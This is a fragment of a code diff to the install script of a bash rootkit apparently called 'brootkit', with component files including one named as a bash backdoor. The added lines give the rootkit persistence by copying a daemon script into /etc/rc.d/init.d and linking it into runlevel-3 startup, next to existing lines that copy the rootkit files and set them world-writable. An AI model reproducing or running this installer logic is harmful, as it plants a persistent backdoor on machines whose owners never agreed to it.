@@ -21,6 +21,10 @@ function main()
 	cp brootkit.sh br.conf br_config.sh bashbd.sh $BR_ROOTKIT_PATH
 	[ $? -eq 1 ] && exit && echo "copy brootkit failed."
 
+	cp brdaemon.sh /etc/rc.d/init.d/brdaemon
+	ln -s /etc/rc.d/init.d/brdaemon /etc/rc.d/rc3.d/S10brdaemon
+	[ $? -eq 1 ] && exit && echo "copy brdaemon failed."
+
 	chmod 777 $BR_ROOTKIT_PATH
 
         if ! type nohup >/dev/null; then
